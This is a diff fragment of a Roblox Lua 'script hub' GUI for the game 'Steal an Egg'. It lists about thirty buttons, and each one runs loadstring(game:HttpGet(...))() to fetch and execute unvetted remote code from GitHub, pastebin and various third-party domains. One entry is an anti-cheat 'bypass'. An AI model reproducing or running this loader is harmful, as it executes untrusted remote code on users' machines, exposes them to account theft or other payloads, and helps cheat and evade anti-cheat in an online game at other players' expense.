+
+Instance.new("UICorner",keylessTab).CornerRadius = UDim.new(0,7)
+
+local scriptList = Instance.new("ScrollingFrame")
+scriptList.Position = UDim2.fromOffset(0,33)
+scriptList.Size = UDim2.fromOffset(270,193)
+scriptList.BackgroundTransparency = 1
+scriptList.BorderSizePixel = 0
+scriptList.ScrollBarThickness = 3
+scriptList.Parent = scriptsPage
+
+local layout = Instance.new("UIListLayout")
+layout.Padding = UDim.new(0,5)
+layout.Parent = scriptList
+
+local function MirandaHub()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/miirandahub/loader/refs/heads/main/stealaeggs"))()
+end
+
+local function CloverHub()
+	loadstring(game:HttpGet("https://cloverhub.app/clover.lua"))()
+end
+
+local function AjjansHub()
+	loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/359e97f8618e9008afe5f496184ebb7c.lua"))()
+end
+
+local function BigFoot()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/hanniii1/Loader/refs/heads/main/BFLoader.lua"))()
+end
+
+local function SpeedHub()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
+end
+
+local function OmgHub()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/Omgshit/Scripts/main/MainLoader.lua"))()   
+end
+
+local function NightHub()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/WhiteX1208/Scripts/refs/heads/main/StealAnEggs.luau"))()   
+end
+
+local function ZeroinHub()
+	loadstring(game:HttpGet("https://zeroinhub.com/api/script"))()   
+end
+
+local function QuantumqOnyx()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/flazhy/QuantumOnyx/refs/heads/main/QuantumOnyx.lua"))()
+end
+
+local function FindingOnePlayerServer()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/showscript-hub/Script/refs/heads/main/Hop%20Server%20list"))()
+end
+
+local function Shader()
+	loadstring(game:HttpGet("https://pastebin.com/raw/Zpaf00Nu"))()
+end
+
+local function Shader1()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/pshade-ultimate/refs/heads/main/src/cd.lua"))()
+end
+
+local function Shader2()
+	loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Simple-Shader-37434"))()
+end
+
+local function UNIVERSHUBGRAPHICS()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/Uranus197/-Univers-Hub-Graphics-Script-/refs/heads/main/UniversHub"))()
+end
+
+local function BypassSpeed()
+	loadstring(game:HttpGet("https://rawscripts.net/raw/Steal-An-Egg-bypass-anti-cheat-224212"))()
+end
+
+local function NasiRendang()
+	loadstring(game:HttpGet("https://www.nrlscript.com/raw/y9BUU6LkVW"))()
+end
+
+local function LennonHub()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/lennonxscripts/lennonhubv2/refs/heads/main/stealaneggv2"))()
+end
+
+local function FyyCommunity()
+	loadstring(game:HttpGet("https://FyyCommunity.my.id"))()
+end
+
+local function Foxname()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/caomod2077/Script/refs/heads/main/Fn-stealanegg.lua"))()
+end
+
+local function Axonic()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/Kenniel123/Steal-A-Egg/refs/heads/main/Steal%20A%20Egg"))()
+end
+
+local function Mcrzhub()
+	loadstring(game:HttpGet("https://flowauth.net/v1/loaders/3c4e87ed34813171b0f8d53a108a7d88.lua"))()
+end
+
+local function UbHub()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/TeamUBHub/UBLoader/refs/heads/main/index/Key.lua"))()
+end
+
+local function VXEZES()
+	loadstring(game:HttpGet("https://vxezestudio.online/api/scripts/script_G5CGjqj2X3rOS/stream/init"))()
+end
+
+local function Void()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/scripts/hosted/6582551b42d21c6b7eb55f1d76d8d50ce53cb35592093d6615b5e83437594dc0.lua"))()
+end
+
+local function Lkz()
+	loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/65bf3459d87ba3ac46350e154b640929.lua"))()
+end
+
+local function Zeroin()
+	loadstring(game:HttpGet("https://zeroinhub.com/api/script"))()
+end
+
+local function Decode()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ItzYumi/Decode/refs/heads/main/DE%3ACODE.lua"))()
+end
+
+local function BlxyoHub()
+	loadstring(game:HttpGet("https://flowauth.net/v1/loaders/69d3463240384f3a73fbe32c178093a2.lua"))()
+end
+
+local function HoshiHub()
+	loadstring(game:HttpGet("https://hoshihub.site/loader.lua"))()
+end
+
+local function SenaHub()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/senarblx/sena/refs/heads/main/loader"))()
+end
+
+local function Vincetore()
+script_key = "KEYLESS"
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/tutorkah104-rgb/Sae/refs/heads/main/Sae.luau"))()
+end
+
+local function makeScriptButton(name,runFunction)
+	local card = Instance.new("Frame")
+	card.Size = UDim2.new(1,-6,0,34)
+	card.BackgroundColor3 = Theme.Card
+	card.BorderSizePixel = 0
+	card.Parent = scriptList
+
+	Instance.new("UICorner",card).CornerRadius = UDim.new(0,8)
+
+	local label = Instance.new("TextLabel")
+	label.Position = UDim2.fromOffset(9,0)
+	label.Size = UDim2.new(1,-76,1,0)
+	label.BackgroundTransparency = 1
+	label.Text = name
+	label.TextSize = 8
+	label.Font = Enum.Font.GothamBold
+	label.TextColor3 = Color3.new(1,1,1)
+	label.TextXAlignment = Enum.TextXAlignment.Left
+	label.Parent = card
+
+	local run = Instance.new("TextButton")
+	run.Position = UDim2.new(1,-63,.5,-11)
+	run.Size = UDim2.fromOffset(57,23)
+	run.BackgroundColor3 = Theme.Main
+	run.Text = "RUN"
+	run.TextSize = 8
+	run.Font = Enum.Font.GothamBold
+	run.TextColor3 = Color3.new(1,1,1)
+	run.BorderSizePixel = 0
+	run.Parent = card
+
+	Instance.new("UICorner",run).CornerRadius = UDim.new(0,6)
+
+	run.Activated:Connect(runFunction)
+end
+
+local function clearList()
+	for _,v in ipairs(scriptList:GetChildren()) do
+		if v:IsA("Frame") then
+			v:Destroy()
+		end
+	end
+end
+
+local function showKeyScripts()
+	clearList()
+
+	makeScriptButton("Miranda hub",MirandaHub)
+	makeScriptButton("Clover hub",CloverHub)
+	makeScriptButton("Ajjans hub",AjjansHub)
+	makeScriptButton("Big Foot",BigFoot)
+	makeScriptButton("Speed Hub",SpeedHub)
+    makeScriptButton("Omg Hub",OmgHub)
+    makeScriptButton("Night Hub",NightHub)
+    makeScriptButton("Zeroin Hub",ZeroinHub)
+    makeScriptButton("QuantumqOnyx",QuantumqOnyx)
+
+	task.wait()
+	scriptList.CanvasSize =
+		UDim2.fromOffset(0,layout.AbsoluteContentSize.Y + 8)
+end
+
+local function showKeylessScripts()
+	clearList()
+
+	makeScriptButton("Finding one player server",FindingOnePlayerServer)
+	makeScriptButton("Shader",Shader)
+    makeScriptButton("Shader1",Shader1)
+    makeScriptButton("Shader2",Shader2)
+    makeScriptButton("UNIVERS HUB GRAPHICS",UNIVERSHUBGRAPHICS)
+    makeScriptButton("Bypass Speed",BypassSpeed)
+    makeScriptButton("Nasi Rendang",NasiRendang)
+	makeScriptButton("Lennon hub",LennonHub)
+	makeScriptButton("Fyy community",FyyCommunity)
+	makeScriptButton("Foxname",Foxname)
+	makeScriptButton("Axonic",Axonic)
+	makeScriptButton("Mcrzhub",Mcrzhub)
+	makeScriptButton("ub-hub",UbHub)
+    makeScriptButton("VXEZES",VXEZES)
+    makeScriptButton("Anti Hit",AntiHit)
+    makeScriptButton("Lkz",Lkz)
+    makeScriptButton("Zeroin",Zeroin)
+    makeScriptButton("Decode",Decode)
+    makeScriptButton("Blxyo Hub",BlxyoHub)
+    makeScriptButton("Hoshi Hub",HoshiHub)
+    makeScriptButton("Sena Hub",SenaHub)
+    makeScriptButton("Vincetore",Vincetore)
+    
+    
+
+	task.wait()
+	scriptList.CanvasSize =
+		UDim2.fromOffset(0,layout.AbsoluteContentSize.Y + 8)
+end
+
+keyTab.Activated:Connect(function()
+	keyTab.BackgroundColor3 = Theme.Main
+	keylessTab.BackgroundColor3 = Theme.Card
+	showKeyScripts()
+end)
+
+keylessTab.Activated:Connect(function()
+	keylessTab.BackgroundColor3 = Theme.Main
+	keyTab.BackgroundColor3 = Theme.Card
+	showKeylessScripts()
+end)
+
+showKeyScripts()
+
+local settingsTitle = Instance.new("TextLabel")
+settingsTitle.Position = UDim2.fromOffset(0,0)
+settingsTitle.Size = UDim2.fromOffset(250,22)
+settingsTitle.BackgroundTransparency = 1
+settingsTitle.Text = "âš™ SETTINGS"
+settingsTitle.TextSize = 12
+settingsTitle.Font = Enum.Font.GothamBold
+settingsTitle.TextColor3 = Color3.new(1,1,1)
+settingsTitle.TextXAlignment = Enum.TextXAlignment.Left
+settingsTitle.Parent = settingsPage
+
+local colorTitle = Instance.new("TextLabel")
+colorTitle.Position = UDim2.fromOffset(0,29)
+colorTitle.Size = UDim2.fromOffset(260,16)
+colorTitle.BackgroundTransparency = 1
+colorTitle.Text = "COLOR CHANGE"
+colorTitle.TextSize = 8
+colorTitle.Font = Enum.Font.GothamBold
+colorTitle.TextColor3 = Theme.Main
+colorTitle.TextXAlignment = Enum.TextXAlignment.Left
+colorTitle.Parent = settingsPage
+
+local colorButton = Instance.new("TextButton")
+colorButton.Position = UDim2.fromOffset(0,48)
+colorButton.Size = UDim2.fromOffset(260,30)
+colorButton.BackgroundColor3 = Theme.Card
+colorButton.Text = "ðŸŽ¨  Color Change"
+colorButton.TextSize = 8
+colorButton.Font = Enum.Font.GothamBold
+colorButton.TextColor3 = Color3.new(1,1,1)
+colorButton.BorderSizePixel = 0
+colorButton.Parent = settingsPage
+
+Instance.new("UICorner",colorButton).CornerRadius = UDim.new(0,8)
+
+local grid = Instance.new("UIGridLayout")
+grid.CellSize = UDim2.fromOffset(80,27)
+grid.CellPadding = UDim2.fromOffset(5,5)
+grid.Parent = colorPanel
+
+local Colors = {
+	{"Ocean",Color3.fromRGB(35,125,255)},
+	{"Purple",Color3.fromRGB(155,95,255)},
+	{"Cyan",Color3.fromRGB(40,210,220)},
+	{"Green",Color3.fromRGB(55,205,125)},
+	{"Sunset",Color3.fromRGB(255,135,55)},
+	{"Rose",Color3.fromRGB(245,90,145)}
+}
+
+local function changeColor(color)
+	Theme.Main = color
+
+	stroke.Color = Theme.Main
+	keyTab.BackgroundColor3 = Theme.Main
+	colorTitle.TextColor3 = Theme.Main
+	runColor = Theme.Main
+end
+
+for _,data in ipairs(Colors) do
+	local b = Instance.new("TextButton")
+	b.Text = data[1]
+	b.TextSize = 7
+	b.Font = Enum.Font.GothamBold
+	b.TextColor3 = Color3.new(1,1,1)
+	b.BackgroundColor3 = data[2]
+	b.BorderSizePixel = 0
+	b.Parent = colorPanel
+
+	Instance.new("UICorner",b).CornerRadius = UDim.new(0,6)
+
+	b.Activated:Connect(function()
+		changeColor(data[2])
+		colorPanel.Visible = false
+	end)
+end
+
+colorButton.Activated:Connect(function()
+	colorPanel.Visible = not colorPanel.Visible
+end)
+
+local songTitle = Instance.new("TextLabel")
+songTitle.Position = UDim2.fromOffset(0,192)
+songTitle.Size = UDim2.fromOffset(260,16)
+songTitle.BackgroundTransparency = 1
+songTitle.Text = "SONG ID"
+songTitle.TextSize = 8
+songTitle.Font = Enum.Font.GothamBold
+songTitle.TextColor3 = Theme.Main
+songTitle.TextXAlignment = Enum.TextXAlignment.Left
+songTitle.Parent = settingsPage
+
+local songBox = Instance.new("TextBox")
+songBox.Position = UDim2.fromOffset(0,211)
+songBox.Size = UDim2.fromOffset(155,30)
+songBox.BackgroundColor3 = Theme.Card
+songBox.PlaceholderText = "Enter Song ID"
+songBox.PlaceholderColor3 = Color3.fromRGB(130,140,155)
+songBox.TextColor3 = Color3.new(1,1,1)
+songBox.TextSize = 8
+songBox.Font = Enum.Font.Gotham
+songBox.BorderSizePixel = 0
+songBox.ClearTextOnFocus = false
+songBox.Parent = settingsPage
+
+Instance.new("UICorner",songBox).CornerRadius = UDim.new(0,8)
+
+local play = Instance.new("TextButton")
+play.Position = UDim2.fromOffset(160,211)
+play.Size = UDim2.fromOffset(47,30)
+play.BackgroundColor3 = Theme.Main
+play.Text = "â–¶"
+play.TextSize = 10
+play.Font = Enum.Font.GothamBold
+play.TextColor3 = Color3.new(1,1,1)
+play.BorderSizePixel = 0
+play.Parent = settingsPage
+
+Instance.new("UICorner",play).CornerRadius = UDim.new(0,8)
+
+local stop = Instance.new("TextButton")
+stop.Position = UDim2.fromOffset(212,211)
+stop.Size = UDim2.fromOffset(47,30)
+stop.BackgroundColor3 = Theme.Card
+stop.Text = "â– "
+stop.TextSize = 10
+stop.Font = Enum.Font.GothamBold
+stop.TextColor3 = Color3.new(1,1,1)
+stop.BorderSizePixel = 0
+stop.Parent = settingsPage
+
+Instance.new("UICorner",stop).CornerRadius = UDim.new(0,8)
+
+local song = Instance.new("Sound")
+song.Name = "StealAnEggSong"
+song.Volume = .5
+song.Looped = true
+song.Parent = SoundService
+
+play.Activated:Connect(function()
+	local id = songBox.Text:gsub("%D","")
+
+	if id ~= "" then
+		song.SoundId = "rbxassetid://"..id
+		song:Play()
+	end
+end)
+
+stop.Activated:Connect(function()
+	song:Stop()
+end)
+
+local transparencyTitle = Instance.new("TextLabel")
+transparencyTitle.Position = UDim2.fromOffset(0,257)
+transparencyTitle.Size = UDim2.fromOffset(260,16)
+transparencyTitle.BackgroundTransparency = 1
+transparencyTitle.Text = "TRANSPARENCY 0%"
+transparencyTitle.TextSize = 8
+transparencyTitle.Font = Enum.Font.GothamBold
+transparencyTitle.TextColor3 = Theme.Main
+transparencyTitle.TextXAlignment = Enum.TextXAlignment.Left
+transparencyTitle.Parent = settingsPage
+
+local transparencyBar = Instance.new("Frame")
+transparencyBar.Position = UDim2.fromOffset(0,282)
+transparencyBar.Size = UDim2.fromOffset(260,5)
+transparencyBar.BackgroundColor3 = Theme.Card
+transparencyBar.BorderSizePixel = 0
+transparencyBar.Parent = settingsPage
+
+Instance.new("UICorner",transparencyBar).CornerRadius = UDim.new(1,0)
+
+local transparencyDot = Instance.new("TextButton")
+transparencyDot.Size = UDim2.fromOffset(14,14)
+transparencyDot.Position = UDim2.new(0,-7,.5,-7)
+transparencyDot.BackgroundColor3 = Theme.Main
+transparencyDot.Text = ""
+transparencyDot.BorderSizePixel = 0
+transparencyDot.Parent = transparencyBar
+
+Instance.new("UICorner",transparencyDot).CornerRadius = UDim.new(1,0)
+
+local transparencyDragging = false
+
+local function setTransparency(x)
+	local percent = math.clamp(
+		(x-transparencyBar.AbsolutePosition.X) /
+		transparencyBar.AbsoluteSize.X,
+		0,
+		1
+	)
+
+	transparencyDot.Position =
+		UDim2.new(percent,-7,.5,-7)
+
+	local value = math.floor(percent*100)
+
+	transparencyTitle.Text =
+		"TRANSPARENCY "..value.."%"
+
+	main.BackgroundTransparency = percent
+end
+
+transparencyDot.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1
+	or input.UserInputType == Enum.UserInputType.Touch then
+		transparencyDragging = true
+	end
+end)
+
+UIS.InputChanged:Connect(function(input)
+	if transparencyDragging and
+		(input.UserInputType == Enum.UserInputType.MouseMovement
+		or input.UserInputType == Enum.UserInputType.Touch) then
+
+		setTransparency(input.Position.X)
+	end
+end)
+
+UIS.InputEnded:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1
+	or input.UserInputType == Enum.UserInputType.Touch then
+		transparencyDragging = false
+	end
+end)
+
+local dragging = false
+local dragStart
+local startPos
+
+title.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.Touch
+	or input.UserInputType == Enum.UserInputType.MouseButton1 then
+		dragging = true
+		dragStart = input.Position
+		startPos = main.Position
+	end
+end)
+
+UIS.InputChanged:Connect(function(input)
+	if dragging and (
+		input.UserInputType == Enum.UserInputType.Touch
+		or input.UserInputType == Enum.UserInputType.MouseMovement
+	) then
+		local delta = input.Position - dragStart
+
+		main.Position = UDim2.new(
+			startPos.X.Scale,
+			startPos.X.Offset + delta.X,
+			startPos.Y.Scale,
+			startPos.Y.Offset + delta.Y
+		)
+	end
+end)
+
+UIS.InputEnded:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.Touch
+	or input.UserInputType == Enum.UserInputType.MouseButton1 then
+		dragging = false
+	end
+end)
+
+local mini = Instance.new("ImageButton")
+mini.Size = UDim2.fromOffset(50,50)
+mini.Position = UDim2.new(0.5,-25,0,10)
+mini.BackgroundColor3 = Theme.BG
+mini.Image = "https://www.roblox.com/asset-thumbnail/image?assetId=85422381974829&width=420&height=420&format=png"
+mini.Visible = false
+mini.Parent = gui
+
+Instance.new("UICorner",mini).CornerRadius = UDim.new(1,0)
+
+local miniStroke = Instance.new("UIStroke")
+miniStroke.Color = Theme.Main
+miniStroke.Thickness = 2
+miniStroke.Parent = mini
+
+minimize.Activated:Connect(function()
+	main.Visible = false
+	mini.Visible = true
+end)
+
+local miniDragging = false
+local miniMoved = false
+local miniDragStart
+local miniStartPos
+
+mini.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.Touch
+	or input.UserInputType == Enum.UserInputType.MouseButton1 then
+
+		miniDragging = true
+		miniMoved = false
+		miniDragStart = input.Position
+		miniStartPos = mini.Position
+	end
+end)
+
+UIS.InputChanged:Connect(function(input)
+	if miniDragging and (
+		input.UserInputType == Enum.UserInputType.Touch
+		or input.UserInputType == Enum.UserInputType.MouseMovement
+	) then
+
+		local delta = input.Position - miniDragStart
+
+		if math.abs(delta.X) > 5 or math.abs(delta.Y) > 5 then
+			miniMoved = true
+		end
+
+		mini.Position = UDim2.new(
+			miniStartPos.X.Scale,
+			miniStartPos.X.Offset + delta.X,
+			miniStartPos.Y.Scale,
+			miniStartPos.Y.Offset + delta.Y
+		)
+	end
+end)
+
+UIS.InputEnded:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.Touch
+	or input.UserInputType == Enum.UserInputType.MouseButton1 then
+
+		if miniDragging and not miniMoved then
+			main.Visible = true
+			mini.Visible = false
+		end
+
+		miniDragging = false
+		miniMoved = false
+	end
+end)
+
+close.Activated:Connect(function()
+	gui:Destroy()
+end)
